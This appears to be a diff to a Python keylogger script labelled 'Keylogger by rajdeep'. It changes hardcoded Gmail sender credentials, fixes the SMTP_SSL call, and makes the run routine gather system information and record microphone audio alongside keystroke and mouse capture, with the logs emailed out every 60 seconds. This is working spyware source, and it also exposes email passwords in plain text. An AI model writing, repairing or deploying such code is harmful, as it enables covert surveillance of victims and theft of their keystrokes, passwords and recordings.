@@ -22,8 +22,8 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "rajdeepkumar1122002@gmail.com"
-    EMAIL_PASSWORD = "Raj@0112"
+    EMAIL_ADDRESS = "poszeus0112@gmail.com"
+    EMAIL_PASSWORD = "qwnj hpaa phwv gssf"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
@@ -72,7 +72,7 @@ finally:
             Keylogger by rajdeep\n"""
 
             m += message
-            with smtplib.SMTP_SSL('smtp.gmail.com',587) as server:
+            with smtplib.SMTP_SSL('smtp.gmail.com') as server:
                 server.login(email, password)
                 server.sendmail(sender, receiver, message)
 
@@ -95,7 +95,7 @@ finally:
             self.appendlog(machine)
 
         def microphone(self):
-            fs = 44100
+            fs = 48000
             seconds = SEND_REPORT_EVERY
             obj = wave.open('sound.wav', 'w')
             obj.setnchannels(1)  # mono
@@ -113,11 +113,15 @@ finally:
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
+            self.system_information()
+            self.microphone()
+            # self.screenshot()
             with keyboard_listener:
                 self.report()
                 keyboard_listener.join()
             with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                 mouse_listener.join()
+            
             if os.name == "nt":
                 try:
                     pwd = os.path.abspath(os.getcwd())
